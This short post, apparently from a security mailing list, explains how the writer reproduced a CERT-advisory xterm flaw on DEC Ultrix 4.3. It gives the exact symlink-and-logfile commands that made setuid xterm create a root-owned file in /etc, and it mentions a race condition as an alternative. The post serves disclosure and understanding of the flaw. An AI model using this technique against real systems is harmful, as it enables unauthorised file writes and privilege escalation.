When I was figuring out what the problem was from the CERT advisory,
it took me two attempts to create a file in /etc as a normal user.

	[DEC Ultrix 4.3, supplied X11R4 xterm]

% pwd
/aber/ccs
% xterm -l -lf /etc/testfile
***	[didn't work]
% ln -s /etc/testfile testfile
% xterm -l -lf ./testfile
***	[worked - session logged to /etc/testfile, file owned by root]

So I didn't need to use a race condition, although that *is* another way
of doing things. 

